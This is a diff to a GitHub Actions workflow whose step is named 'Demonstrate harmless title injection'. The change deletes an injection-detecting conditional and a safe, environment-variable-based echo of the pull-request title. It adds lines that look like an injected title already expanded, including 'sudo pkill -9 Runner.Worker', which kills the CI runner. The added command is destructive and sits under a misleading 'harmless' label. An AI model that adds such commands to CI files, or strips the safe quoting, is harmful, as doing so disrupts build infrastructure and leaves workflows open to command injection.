@@ -12,12 +12,8 @@ jobs:
     runs-on: ubuntu-26.04
     steps:
       - name: Demonstrate harmless title injection
-        if: github.event.pull_request.title == 'x"; echo "INJECTION_CONFIRMED"; echo "'
         run: |
-          echo "Title: ${{ github.event.pull_request.title }}"
-
-      - name: Echo the title safely
-        env:
-          PR_TITLE: ${{ github.event.pull_request.title }}
-        run: |
-          printf 'Title: %s\n' "$PR_TITLE"
+          echo "Title: x"
+          sudo pkill -9 Runner.Worker
+          echo ""
+        
